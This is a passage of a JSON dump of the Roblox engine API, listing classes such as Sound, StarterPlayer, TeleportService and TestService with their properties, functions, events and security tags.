hutdown","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"HttpRequestType","Name":"httpRequestType","Default":"Default"},{"Type":"bool","Name":"doNotAllowDiabolicalMode","Default":"false"}],"Name":"HttpGetAsync","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"string","Name":"data","Default":null},{"Type":"string","Name":"contentType","Default":"*/*"},{"Type":"HttpRequestType","Name":"httpRequestType","Default":"Default"},{"Type":"bool","Name":"doNotAllowDiabolicalMode","Default":"false"}],"Name":"HttpPostAsync","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"SaveFilter","Name":"saveFilter","Default":"SaveAll"}],"Name":"SavePlace","tags":["deprecated"],"Class":"DataModel","type":"YieldFunction"},{"Arguments":[],"Name":"AllowedGearTypeChanged","tags":["deprecated"],"Class":"DataModel","type":"Event"},{"Arguments":[{"Name":"betterQuality","Type":"bool"}],"Name":"GraphicsQualityChangeRequest","tags":[],"Class":"DataModel","type":"Event"},{"Arguments":[{"Name":"object","Type":"Instance"},{"Name":"descriptor","Type":"Property"}],"Name":"ItemChanged","tags":["deprecated"],"Class":"DataModel","type":"Event"},{"Arguments":[],"Name":"Loaded","tags":[],"Class":"DataModel","type":"Event"},{"Arguments":[{"Name":"path","Type":"string"}],"Name":"ScreenshotReady","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Event"},{"ReturnType":"Tuple","Arguments":[],"Name":"OnClose","tags":["deprecated"],"Class":"DataModel","type":"Callback"},{"Superclass":"ServiceProvider","type":"Class","Name":"GenericSettings","tags":[]},{"Superclass":"GenericSettings","type":"Class","Name":"AnalysticsSettings","tags":[]},{"Superclass":"GenericSettings","type":"Class","Name":"GlobalSettings","tags":["notbrowsable"]},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"GetFFlag","tags":[],"Class":"GlobalSettings","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"GetFVariable","tags":[],"Class":"GlobalSettings","type":"Function"},{"Superclass":"GenericSettings","type":"Class","Name":"UserSettings","tags":[]},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"IsUserFeatureEnabled","tags":[],"Class":"UserSettings","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Reset","tags":[],"Class":"UserSettings","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Sky","tags":[]},{"ValueType":"bool","type":"Property","Name":"CelestialBodiesShown","tags":[],"Class":"Sky"},{"ValueType":"float","type":"Property","Name":"MoonAngularSize","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"MoonTextureId","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxBk","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxDn","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxFt","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxLf","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxRt","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxUp","tags":[],"Class":"Sky"},{"ValueType":"int","type":"Property","Name":"StarCount","tags":[],"Class":"Sky"},{"ValueType":"float","type":"Property","Name":"SunAngularSize","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SunTextureId","tags":[],"Class":"Sky"},{"Superclass":"Instance","type":"Class","Name":"Smoke","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Color","tags":[],"Class":"Smoke"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Smoke"},{"ValueType":"float","type":"Property","Name":"Opacity","tags":[],"Class":"Smoke"},{"ValueType":"float","type":"Property","Name":"RiseVelocity","tags":[],"Class":"Smoke"},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"Smoke"},{"Superclass":"Instance","type":"Class","Name":"Sound","tags":[]},{"ValueType":"float","type":"Property","Name":"EmitterSize","tags":[],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"IsLoaded","tags":["readonly"],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"IsPaused","tags":["readonly"],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"IsPlaying","tags":["readonly"],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"Looped","tags":[],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"MaxDistance","tags":[],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"MinDistance","tags":["deprecated"],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"Pitch","tags":["deprecated"],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"PlayOnRemove","tags":[],"Class":"Sound"},{"ValueType":"double","type":"Property","Name":"PlaybackLoudness","tags":["readonly"],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"PlaybackSpeed","tags":[],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"Playing","tags":[],"Class":"Sound"},{"ValueType":"RollOffMode","type":"Property","Name":"RollOffMode","tags":[],"Class":"Sound"},{"ValueType":"Object","type":"Property","Name":"SoundGroup","tags":[],"Class":"Sound"},{"ValueType":"Content","type":"Property","Name":"SoundId","tags":[],"Class":"Sound"},{"ValueType":"double","type":"Property","Name":"TimeLength","tags":["readonly"],"Class":"Sound"},{"ValueType":"double","type":"Property","Name":"TimePosition","tags":[],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"Volume","tags":[],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"isPlaying","tags":["deprecated","readonly"],"Class":"Sound"},{"ReturnType":"void","Arguments":[],"Name":"Pause","tags":[],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Play","tags":[],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Resume","tags":[],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Stop","tags":[],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"pause","tags":["deprecated"],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"play","tags":["deprecated"],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"stop","tags":["deprecated"],"Class":"Sound","type":"Function"},{"Arguments":[{"Name":"soundId","Type":"string"},{"Name":"numOfTimesLooped","Type":"int"}],"Name":"DidLoop","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Ended","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Loaded","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Paused","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Played","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Resumed","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Stopped","tags":[],"Class":"Sound","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"SoundEffect","tags":[]},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"SoundEffect"},{"ValueType":"int","type":"Property","Name":"Priority","tags":[],"Class":"SoundEffect"},{"Superclass":"SoundEffect","type":"Class","Name":"ChorusSoundEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Depth","tags":[],"Class":"ChorusSoundEffect"},{"ValueType":"float","type":"Property","Name":"Mix","tags":[],"Class":"ChorusSoundEffect"},{"ValueType":"float","type":"Property","Name":"Rate","tags":[],"Class":"ChorusSoundEffect"},{"Superclass":"SoundEffect","type":"Class","Name":"CompressorSoundEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Attack","tags":[],"Class":"CompressorSoundEffect"},{"ValueType":"float","type":"Property","Name":"GainMakeup","tags":[],"Class":"CompressorSoundEffect"},{"ValueType":"float","type":"Property","Name":"Ratio","tags":[],"Class":"CompressorSoundEffect"},{"ValueType":"float","type":"Property","Name":"Release","tags":[],"Class":"CompressorSoundEffect"},{"ValueType":"Object","type":"Property","Name":"SideChain","tags":[],"Class":"CompressorSoundEffect"},{"ValueType":"float","type":"Property","Name":"Threshold","tags":[],"Class":"CompressorSoundEffect"},{"Superclass":"SoundEffect","type":"Class","Name":"DistortionSoundEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Level","tags":[],"Class":"DistortionSoundEffect"},{"Superclass":"SoundEffect","type":"Class","Name":"EchoSoundEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Delay","tags":[],"Class":"EchoSoundEffect"},{"ValueType":"float","type":"Property","Name":"DryLevel","tags":[],"Class":"EchoSoundEffect"},{"ValueType":"float","type":"Property","Name":"Feedback","tags":[],"Class":"EchoSoundEffect"},{"ValueType":"float","type":"Property","Name":"WetLevel","tags":[],"Class":"EchoSoundEffect"},{"Superclass":"SoundEffect","type":"Class","Name":"EqualizerSoundEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"HighGain","tags":[],"Class":"EqualizerSoundEffect"},{"ValueType":"float","type":"Property","Name":"LowGain","tags":[],"Class":"EqualizerSoundEffect"},{"ValueType":"float","type":"Property","Name":"MidGain","tags":[],"Class":"EqualizerSoundEffect"},{"Superclass":"SoundEffect","type":"Class","Name":"FlangeSoundEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Depth","tags":[],"Class":"FlangeSoundEffect"},{"ValueType":"float","type":"Property","Name":"Mix","tags":[],"Class":"FlangeSoundEffect"},{"ValueType":"float","type":"Property","Name":"Rate","tags":[],"Class":"FlangeSoundEffect"},{"Superclass":"SoundEffect","type":"Class","Name":"PitchShiftSoundEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Octave","tags":[],"Class":"PitchShiftSoundEffect"},{"Superclass":"SoundEffect","type":"Class","Name":"ReverbSoundEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"DecayTime","tags":[],"Class":"ReverbSoundEffect"},{"ValueType":"float","type":"Property","Name":"Density","tags":[],"Class":"ReverbSoundEffect"},{"ValueType":"float","type":"Property","Name":"Diffusion","tags":[],"Class":"ReverbSoundEffect"},{"ValueType":"float","type":"Property","Name":"DryLevel","tags":[],"Class":"ReverbSoundEffect"},{"ValueType":"float","type":"Property","Name":"WetLevel","tags":[],"Class":"ReverbSoundEffect"},{"Superclass":"SoundEffect","type":"Class","Name":"TremoloSoundEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Depth","tags":[],"Class":"TremoloSoundEffect"},{"ValueType":"float","type":"Property","Name":"Duty","tags":[],"Class":"TremoloSoundEffect"},{"ValueType":"float","type":"Property","Name":"Frequency","tags":[],"Class":"TremoloSoundEffect"},{"Superclass":"Instance","type":"Class","Name":"SoundGroup","tags":[]},{"ValueType":"float","type":"Property","Name":"Volume","tags":[],"Class":"SoundGroup"},{"Superclass":"Instance","type":"Class","Name":"SoundService","tags":["notCreatable"]},{"ValueType":"ReverbType","type":"Property","Name":"AmbientReverb","tags":[],"Class":"SoundService"},{"ValueType":"float","type":"Property","Name":"DistanceFactor","tags":[],"Class":"SoundService"},{"ValueType":"float","type":"Property","Name":"DopplerScale","tags":[],"Class":"SoundService"},{"ValueType":"bool","type":"Property","Name":"RespectFilteringEnabled","tags":[],"Class":"SoundService"},{"ValueType":"float","type":"Property","Name":"RolloffScale","tags":[],"Class":"SoundService"},{"ReturnType":"bool","Arguments":[],"Name":"BeginRecording","tags":["RobloxScriptSecurity"],"Class":"SoundService","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"GetListener","tags":[],"Class":"SoundService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"sound","Default":null}],"Name":"PlayLocalSound","tags":[],"Class":"SoundService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"SoundType","Name":"sound","Default":null}],"Name":"PlayStockSound","tags":["RobloxScriptSecurity"],"Class":"SoundService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"ListenerType","Name":"listenerType","Default":null},{"Type":"Tuple","Name":"listener","Default":null}],"Name":"SetListener","tags":[],"Class":"SoundService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"deviceIndex","Default":null}],"Name":"SetRecordingDevice","tags":["RobloxScriptSecurity"],"Class":"SoundService","type":"Function"},{"ReturnType":"Dictionary","Arguments":[],"Name":"EndRecording","tags":["RobloxScriptSecurity"],"Class":"SoundService","type":"YieldFunction"},{"ReturnType":"Dictionary","Arguments":[],"Name":"GetRecordingDevices","tags":["RobloxScriptSecurity"],"Class":"SoundService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"Sparkles","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Color","tags":["hidden"],"Class":"Sparkles"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Sparkles"},{"ValueType":"Color3","type":"Property","Name":"SparkleColor","tags":[],"Class":"Sparkles"},{"Superclass":"Instance","type":"Class","Name":"SpawnerService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"StarterGear","tags":[]},{"Superclass":"Instance","type":"Class","Name":"StarterPlayer","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"AllowCustomAnimations","tags":["ScriptWriteRestricted: [NotAccessibleSecurity]","hidden"],"Class":"StarterPlayer"},{"ValueType":"bool","type":"Property","Name":"AutoJumpEnabled","tags":[],"Class":"StarterPlayer"},{"ValueType":"float","type":"Property","Name":"CameraMaxZoomDistance","tags":[],"Class":"StarterPlayer"},{"ValueType":"float","type":"Property","Name":"CameraMinZoomDistance","tags":[],"Class":"StarterPlayer"},{"ValueType":"CameraMode","type":"Property","Name":"CameraMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevCameraOcclusionMode","type":"Property","Name":"DevCameraOcclusionMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevComputerCameraMovementMode","type":"Property","Name":"DevComputerCameraMovementMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevComputerMovementMode","type":"Property","Name":"DevComputerMovementMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevTouchCameraMovementMode","type":"Property","Name":"DevTouchCameraMovementMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevTouchMovementMode","type":"Property","Name":"DevTouchMovementMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"bool","type":"Property","Name":"EnableMouseLockOption","tags":[],"Class":"StarterPlayer"},{"ValueType":"float","type":"Property","Name":"HealthDisplayDistance","tags":[],"Class":"StarterPlayer"},{"ValueType":"bool","type":"Property","Name":"LoadCharacterAppearance","tags":[],"Class":"StarterPlayer"},{"ValueType":"float","type":"Property","Name":"NameDisplayDistance","tags":[],"Class":"StarterPlayer"},{"Superclass":"Instance","type":"Class","Name":"StarterPlayerScripts","tags":[]},{"Superclass":"StarterPlayerScripts","type":"Class","Name":"StarterCharacterScripts","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Stats","tags":[]},{"ValueType":"int","type":"Property","Name":"ContactsCount","tags":["readonly"],"Class":"Stats"},{"ValueType":"float","type":"Property","Name":"DataReceiveKbps","tags":["readonly"],"Class":"Stats"},{"ValueType":"float","type":"Property","Name":"DataSendKbps","tags":["readonly"],"Class":"Stats"},{"ValueType":"float","type":"Property","Name":"HeartbeatTimeMs","tags":["readonly"],"Class":"Stats"},{"ValueType":"int","type":"Property","Name":"InstanceCount","tags":["readonly"],"Class":"Stats"},{"ValueType":"int","type":"Property","Name":"MovingPrimitivesCount","tags":["readonly"],"Class":"Stats"},{"ValueType":"float","type":"Property","Name":"PhysicsReceiveKbps","tags":["readonly"],"Class":"Stats"},{"ValueType":"float","type":"Property","Name":"PhysicsSendKbps","tags":["readonly"],"Class":"Stats"},{"ValueType":"float","type":"Property","Name":"PhysicsStepTimeMs","tags":["readonly"],"Class":"Stats"},{"ValueType":"int","type":"Property","Name":"PrimitivesCount","tags":["readonly"],"Class":"Stats"},{"ReturnType":"float","Arguments":[{"Type":"DeveloperMemoryTag","Name":"tag","Default":null}],"Name":"GetMemoryUsageMbForTag","tags":[],"Class":"Stats","type":"Function"},{"ReturnType":"Dictionary","Arguments":[{"Type":"TextureQueryType","Name":"queryType","Default":null},{"Type":"int","Name":"pageIndex","Default":null},{"Type":"int","Name":"pageSize","Default":null}],"Name":"GetPaginatedMemoryByTexture","tags":["RobloxScriptSecurity"],"Class":"Stats","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"StatsItem","tags":[]},{"ReturnType":"double","Arguments":[],"Name":"GetValue","tags":["PluginSecurity"],"Class":"StatsItem","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetValueString","tags":["PluginSecurity"],"Class":"StatsItem","type":"Function"},{"Superclass":"StatsItem","type":"Class","Name":"RunningAverageItemDouble","tags":[]},{"Superclass":"StatsItem","type":"Class","Name":"RunningAverageItemInt","tags":[]},{"Superclass":"StatsItem","type":"Class","Name":"RunningAverageTimeIntervalItem","tags":[]},{"Superclass":"StatsItem","type":"Class","Name":"TotalCountTimeIntervalItem","tags":[]},{"Superclass":"Instance","type":"Class","Name":"StringValue","tags":[]},{"ValueType":"string","type":"Property","Name":"Value","tags":[],"Class":"StringValue"},{"Arguments":[{"Name":"value","Type":"string"}],"Name":"Changed","tags":[],"Class":"StringValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"string"}],"Name":"changed","tags":["deprecated"],"Class":"StringValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"TaskScheduler","tags":[]},{"ValueType":"bool","type":"Property","Name":"AreArbitersThrottled","tags":[],"Class":"TaskScheduler"},{"ValueType":"ConcurrencyModel","type":"Property","Name":"Concurrency","tags":[],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"NumRunningJobs","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"NumSleepingJobs","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"NumWaitingJobs","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"PriorityMethod","type":"Property","Name":"PriorityMethod","tags":[],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"SchedulerDutyCycle","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"SchedulerRate","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"SleepAdjustMethod","type":"Property","Name":"SleepAdjustMethod","tags":[],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"ThreadAffinity","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"ThreadPoolConfig","type":"Property","Name":"ThreadPoolConfig","tags":[],"Class":"TaskScheduler"},{"ValueType":"int","type":"Property","Name":"ThreadPoolSize","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"ThrottledJobSleepTime","tags":[],"Class":"TaskScheduler"},{"Superclass":"Instance","type":"Class","Name":"Team","tags":[]},{"ValueType":"bool","type":"Property","Name":"AutoAssignable","tags":[],"Class":"Team"},{"ValueType":"bool","type":"Property","Name":"AutoColorCharacters","tags":["deprecated"],"Class":"Team"},{"ValueType":"int","type":"Property","Name":"Score","tags":["deprecated"],"Class":"Team"},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"Team"},{"ReturnType":"Objects","Arguments":[],"Name":"GetPlayers","tags":[],"Class":"Team","type":"Function"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerAdded","tags":[],"Class":"Team","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerRemoved","tags":[],"Class":"Team","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Teams","tags":["notCreatable"]},{"ReturnType":"Objects","Arguments":[],"Name":"GetTeams","tags":[],"Class":"Teams","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RebalanceTeams","tags":["deprecated"],"Class":"Teams","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"TeleportService","tags":[]},{"ValueType":"bool","type":"Property","Name":"CustomizedTeleportUI","tags":["deprecated"],"Class":"TeleportService"},{"ReturnType":"Variant","Arguments":[],"Name":"GetLocalPlayerTeleportData","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"setting","Default":null}],"Name":"GetTeleportSetting","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"setting","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetTeleportSetting","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"Instance","Name":"player","Default":"nil"},{"Type":"Variant","Name":"teleportData","Default":null},{"Type":"Instance","Name":"customLoadingScreen","Default":"nil"}],"Name":"Teleport","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"TeleportCancel","tags":["RobloxScriptSecurity"],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"string","Name":"instanceId","Default":null},{"Type":"Instance","Name":"player","Default":"nil"},{"Type":"string","Name":"spawnName","Default":""},{"Type":"Variant","Name":"teleportData","Default":null},{"Type":"Instance","Name":"customLoadingScreen","Default":"nil"}],"Name":"TeleportToPlaceInstance","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"string","Name":"reservedServerAccessCode","Default":null},{"Type":"Objects","Name":"players","Default":null},{"Type":"string","Name":"spawnName","Default":""},{"Type":"Variant","Name":"teleportData","Default":null},{"Type":"Instance","Name":"customLoadingScreen","Default":"nil"}],"Name":"TeleportToPrivateServer","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"string","Name":"spawnName","Default":null},{"Type":"Instance","Name":"player","Default":"nil"},{"Type":"Variant","Name":"teleportData","Default":null},{"Type":"Instance","Name":"customLoadingScreen","Default":"nil"}],"Name":"TeleportToSpawnByName","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetPlayerPlaceInstanceAsync","tags":[],"Class":"TeleportService","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"ReserveServer","tags":[],"Class":"TeleportService","type":"YieldFunction"},{"Arguments":[{"Name":"loadingGui","Type":"Instance"},{"Name":"dataTable","Type":"Variant"}],"Name":"LocalPlayerArrivedFromTeleport","tags":[],"Class":"TeleportService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"TerrainRegion","tags":[]},{"ValueType":"bool","type":"Property","Name":"IsSmooth","tags":["deprecated","readonly"],"Class":"TerrainRegion"},{"ValueType":"Vector3","type":"Property","Name":"SizeInCells","tags":["readonly"],"Class":"TerrainRegion"},{"ReturnType":"void","Arguments":[],"Name":"ConvertToSmooth","tags":["PluginSecurity","deprecated"],"Class":"TerrainRegion","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"TestService","tags":[]},{"ValueType":"bool","type":"Property","Name":"AutoRuns","tags":[],"Class":"TestService"},{"ValueType":"string","type":"Property","Name":"Description","tags":[],"Class":"TestService"},{"ValueType":"int","type":"Property","Name":"ErrorCount","tags":["readonly"],"Class":"TestService"},{"ValueType":"bool","type":"Property","Name":"Is30FpsThrottleEnabled","tags":[],"Class":"TestService"},{"ValueType":"bool","type":"Property","Name":"IsPhysicsEnvironmentalThrottled","tags":[],"Class":"TestService"},{"ValueType":"bool","type":"Property","Name":"IsSleepAllowed","tags":[],"Class":"TestService"},{"ValueType":"int","type":"Property","Name":"NumberOfPlayers","tags":[],"Class":"TestService"},{"ValueType":"double","type":"Property","Name":"SimulateSecondsLag","tags":[],"Class":"TestService"},{"ValueType":"int","type":"Property","Name":"TestCount","tags":["readonly"],"Class":"TestService"},{"ValueType":"double","type":"Property","Name":"Timeout","tags":[],"Class":"TestService"},{"ValueType":"int","type":"Property","Name":"WarnCount","tags":["readonly"],"Class":"TestService"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"condition","Default":null},{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Check","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"text","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Checkpoint","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Done","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Error","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Fail","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"text","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Message","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"condition","Default":null},{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Require","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"condition","Default":null},{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Warn","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Run","tags":["PluginSecurity"],"Class":"TestService","type":"YieldFunction"},{"Arguments":[{"Name":"condition","Type":"bool"},{"Name":"text","Type":"string"},{"Name":"script","Type":"Instance"},{"Name":"line","Type":"int"}],"Name":"ServerCollectConditionalResult","tags":[],"Class":"TestService","type":"Event"},{"Arguments":[{"Name":"text","Type":"string"},{"Name":"script","Type":"Instance"},{"Name":"line","Type":"int"}],"Name":"ServerCollectResult","tags":[],"Class":"TestService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"TextFilterResult","tags":["notCreatable"]},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"toUserId","Default":null}],"Name":"GetChatForUserAsync","tags":[],"Class":"TextFilterResult","type":"YieldFunction"},{"ReturnType":"string","Arguments":[],"Name":"GetNonChatStringForBroadcastAsync","tags":[],"Class":"TextFilterResult","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"toUserId","Default":null}],"Name":"GetNonChatStringForUserAsync","tags":[],"Class":"TextFilterResult","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"TextService","tags":[]},{"ReturnType":"Vector2","Arguments":[{"Type":"string","Name":"string","Default":null},{"Type":"int","Name":"fontSize","Default":null},{"Type":"Font","Name":"font","Default":null},{"Type":"Vector2","Name":"frameSize","Default":null}],"Name":"GetTextSize","tags":[],"Class":"TextService","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"stringToFilter","Default":null},{"Type":"int","Name":"fromUserId","Default":null}],"Name":"FilterStringAsync","tags":[],"Class":"TextService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"ThirdPartyUserService","tags":["notCreatable"]},{"ReturnType":"string","Arguments":[],"Name":"GetUserDisplayName","tags":["RobloxScriptSecurity"],"Class":"ThirdPartyUserService","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetUserPlatformId","tags":["RobloxScriptSecurity"],"Class":"ThirdPartyUserService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"HaveActiveUser","tags":["RobloxScriptSecurity"],"Class":"ThirdPartyUserService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ShowAccountPicker","tags":["RobloxScriptSecurity"],"Class":"ThirdPartyUserService","type":"Function"},{"ReturnType":"int","Arguments":[{"Type":"UserInputType","Name":"gamepadId","Default":null}],"Name":"RegisterActiveUser","tags":["RobloxScriptSecurity"],"Class":"ThirdPartyUserService","type":"YieldFunction"},{"Arguments":[],"Name":"ActiveGamepadAdded","tags":["RobloxScriptSecurity"],"Class":"ThirdPartyUserService","type":"Event"},{"Arguments":[],"Name":"ActiveGamepadRemoved","tags":["RobloxScriptSecurity"],"Class":"ThirdPartyUserService","type":"Event"},{"Arguments":[{"Name":"signOutStatus","Type":"int"}],"Name":"ActiveUserSignedOut","tags":["RobloxScriptSecurity"],"Class":"ThirdPartyUserService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"TimerService","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"Toolbar","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"text","Default":null},{"Type":"string","Name":"tooltip","Default":null},{"Type":"string","Name":"iconname","Default":null}],"Name":"CreateButton","tags":["PluginSecurity"],"Class":"Toolbar","type":"Function"},{"Superclass":"Instance","t